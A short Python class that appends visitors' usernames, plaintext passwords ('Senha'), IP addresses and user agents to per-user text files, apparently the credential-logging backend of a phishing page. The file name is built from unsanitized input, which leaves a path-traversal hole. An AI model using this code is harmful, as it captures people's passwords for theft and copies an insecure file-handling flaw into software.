class Files:
    @staticmethod
    def create_file(username: str, password: str, user_ip: str, user_agent: str) -> None:
        with open(f'./files/{user_ip}_{username}.txt', 'a+') as file:
            file.write(f'IP: {user_ip}\n')
            file.write(f'Login: {username}\n')
            file.write(f'Senha: {password}\n')
            file.write('\n')
            file.write(user_agent)
            file.write('\n')
            file.write('=' * len(user_agent))
            file.write('\n')
